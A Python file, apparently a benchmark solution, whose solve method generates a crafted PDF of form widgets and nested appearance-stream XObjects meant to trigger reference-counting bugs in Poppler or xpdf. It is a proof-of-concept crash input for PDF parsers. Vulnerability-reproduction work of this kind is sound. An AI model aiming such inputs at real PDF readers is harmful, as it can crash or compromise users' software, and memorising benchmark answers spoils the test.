import io
import os
import tarfile
from typing import List, Tuple


class Solution:
    def _build_pdf(self, obj_contents: List[bytes]) -> bytes:
        # obj_contents[i-1] corresponds to object number i (generation 0)
        header = b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"
        out = bytearray(header)

        offsets = [0] * (len(obj_contents) + 1)  # offsets[0] for object 0 (free)
        offsets[0] = 0

        for i, body in enumerate(obj_contents, start=1):
            offsets[i] = len(out)
            out += str(i).encode("ascii") + b" 0 obj\n"
            out += body
            if not body.endswith(b"\n"):
                out += b"\n"
            out += b"endobj\n"

        xref_off = len(out)
        n = len(obj_contents) + 1
        out += b"xref\n"
        out += b"0 " + str(n).encode("ascii") + b"\n"
        out += b"0000000000 65535 f \n"
        for i in range(1, n):
            out += f"{offsets[i]:010d} 00000 n \n".encode("ascii")

        out += b"trailer\n"
        out += b"<< /Size " + str(n).encode("ascii") + b" /Root 1 0 R >>\n"
        out += b"startxref\n"
        out += str(xref_off).encode("ascii") + b"\n"
        out += b"%%EOF\n"
        return bytes(out)

    def _stream_obj(self, dict_prefix: bytes, data: bytes) -> bytes:
        # dict_prefix must start with b"<<"
        if not dict_prefix.strip().startswith(b"<<"):
            raise ValueError("dict_prefix must start with <<")
        d = dict_prefix.rstrip()
        if d.endswith(b">>"):
            d = d[:-2].rstrip()
        d += b" /Length " + str(len(data)).encode("ascii") + b" >>\n"
        return d + b"stream\n" + data + b"endstream\n"

    def _looks_like_poppler_or_xpdf(self, src_path: str) -> bool:
        try:
            with tarfile.open(src_path, "r:*") as tf:
                names = tf.getnames()
                # quick filename heuristics
                for needle in (
                    "poppler",
                    "xpdf",
                    "goo/GooString",
                    "poppler/Object.h",
                    "poppler/Object.cc",
                    "xpdf/Object.h",
                    "xpdf/Object.cc",
                    "poppler/Annot",
                    "xpdf/Annot",
                ):
                    for n in names[: min(len(names), 5000)]:
                        if needle in n:
                            return True
                # quick content heuristics in a few small files
                candidates = []
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    if m.size <= 200000 and any(m.name.endswith(s) for s in (".h", ".cc", ".cpp")):
                        candidates.append(m)
                    if len(candidates) >= 50:
                        break
                for m in candidates:
                    try:
                        f = tf.extractfile(m)
                        if not f:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    if b"class Object" in data and b"class Dict" in data and b"refCnt" in data:
                        return True
                    if b"standalone" in data.lower() and b"form" in data.lower() and b"Object(" in data:
                        return True
        except Exception:
            return False
        return False

    def solve(self, src_path: str) -> bytes:
        # Crafted small PDF using a widget annotation with an appearance stream (Form XObject).
        # Resources dictionary is direct and nested to increase likelihood of Dict/Object refcount mishandling.
        # Also includes AcroForm/Field linkage to exercise form-related code paths.
        _ = self._looks_like_poppler_or_xpdf(src_path)  # heuristic; PoC is PDF regardless

        obj1 = b"<< /Type /Catalog /Pages 2 0 R /AcroForm 7 0 R >>\n"
        obj2 = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n"
        obj3 = (
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100]\n"
            b"   /Resources << >>\n"
            b"   /Contents 5 0 R\n"
            b"   /Annots [4 0 R]\n"
            b">>\n"
        )
        obj4 = (
            b"<< /Type /Annot /Subtype /Widget /Rect [0 0 10 10]\n"
            b"   /P 3 0 R\n"
            b"   /Parent 8 0 R\n"
            b"   /AP << /N 6 0 R >>\n"
            b"   /F 4\n"
            b">>\n"
        )
        obj5 = self._stream_obj(b"<< >>", b"")
        # Appearance (standalone) form XObject with direct nested Resources dict
        form_data = b"q\n/F1 Do\nQ\n"
        obj6 = self._stream_obj(
            b"<< /Type /XObject /Subtype /Form /FormType 1 /BBox [0 0 10 10]\n"
            b"   /Matrix [1 0 0 1 0 0]\n"
            b"   /Resources << /ProcSet [/PDF] /XObject << /F1 9 0 R >> >>\n"
            b">>",
            form_data,
        )
        obj7 = b"<< /Fields [8 0 R] /NeedAppearances false >>\n"
        obj8 = b"<< /FT /Tx /T (A) /V (B) /Kids [4 0 R] >>\n"
        # Nested form
        obj9 = self._stream_obj(
            b"<< /Type /XObject /Subtype /Form /FormType 1 /BBox [0 0 10 10]\n"
            b"   /Resources << >>\n"
            b">>",
            b"",
        )

        return self._build_pdf([obj1, obj2, obj3, obj4, obj5, obj6, obj7, obj8, obj9])